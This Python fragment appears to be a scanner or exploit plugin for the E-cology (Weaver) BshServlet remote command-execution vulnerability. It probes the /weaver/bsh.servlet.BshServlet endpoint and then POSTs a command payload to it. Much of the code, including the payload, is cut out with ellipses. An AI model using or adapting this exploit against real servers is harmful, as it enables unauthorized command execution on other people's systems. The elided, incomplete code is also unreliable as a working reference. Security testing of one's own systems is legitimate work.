...
def vuln_info():
    info={
        'vuln_name': 'E-cology BshServlet命令执行漏洞',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        status = requests.get(url + '/weaver/bsh.servlet.BshServlet',verify=False,timeout=10,headers=heads)
        if (status.status_code == 200):
            result['Result'] = True
            result['Result_Info']= "/weaver/bsh.servlet.BshServlet"
        return result
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type'] == 'cmd':
            ...
            if (status.status_code == 200 and ("访问禁止" not in status.text)):
                resp = requests.post(url=url + '/weaver/bsh.servlet.BshServlet', verify=False, data=payload, headers=heads, timeout=8)
